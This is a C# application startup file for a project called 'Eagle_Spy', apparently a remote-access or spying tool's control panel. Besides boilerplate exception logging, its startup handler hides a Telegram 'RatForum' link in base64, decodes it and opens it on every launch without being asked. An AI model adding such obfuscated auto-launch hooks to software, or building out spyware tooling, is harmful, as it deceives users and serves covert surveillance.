using System;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic.ApplicationServices;
using System.Collections.ObjectModel;
using System.Diagnostics;
using UnhandledExceptionEventArgs = Microsoft.VisualBasic.ApplicationServices.UnhandledExceptionEventArgs;
using System.Text;

namespace Eagle_Spy.My
{
    internal class MyApplication : WindowsFormsApplicationBase
    {
        [STAThread]
        [DebuggerHidden]
        internal static void Main(string[] Args)
        {
            try
            {
                Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
            }
            finally
            {
            }
            MyProject.Application.Run(Args);
        }

        private void MyApplication_Startup(object sender, StartupEventArgs e)
        {
            try
            {
                string base64Link = "aHR0cHM6Ly90Lm1lL1JhdEZvcnVt"; 
                byte[] data = Convert.FromBase64String(base64Link);
                string decodedUrl = Encoding.UTF8.GetString(data);
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = decodedUrl,
                    UseShellExecute = true,
                    Verb = "open" 
                };
                Process.Start(psi);
            }
            catch (FormatException)
            {
                MessageBox.Show("Invalid", "Error");
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error" + ex.Message, "Error");
            }
        }

        private void MyApplication_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            string logFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Errorlogs.txt");

            if (!File.Exists(logFilePath))
            {
                File.Create(logFilePath).Dispose();
            }

            Exception ex = e.Exception;
            string logDetails = $"Unhandled Exception: {ex.Message}\r\nStack Trace: {ex.StackTrace}\r\n-------------------\r\n";

            try
            {
                File.AppendAllText(logFilePath, logDetails);
            }
            catch (Exception logEx)
            {
                MessageBox.Show("Error logging the exception: " + logEx.Message, "Logging Error");
            }

            MessageBox.Show("Unhandled Exception occurred: " + ex.Message, "Error");

            e.ExitApplication = true;
        }

        [DebuggerStepThrough]
        public MyApplication() : base(AuthenticationMode.Windows)
        {
            base.Startup += MyApplication_Startup;
            base.UnhandledException += MyApplication_UnhandledException;
            base.IsSingleInstance = false;
            base.EnableVisualStyles = true;
            base.SaveMySettingsOnExit = true;
            base.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
        }

        [DebuggerStepThrough]
        protected override void OnCreateMainForm()
        {
            base.MainForm = MyProject.Forms.EagleSpyMain;
        }

        [DebuggerStepThrough]
        protected override bool OnInitialize(ReadOnlyCollection<string> commandLineArgs)
        {
            base.MinimumSplashScreenDisplayTime = 0;
            return base.OnInitialize(commandLineArgs);
        }
    }
}
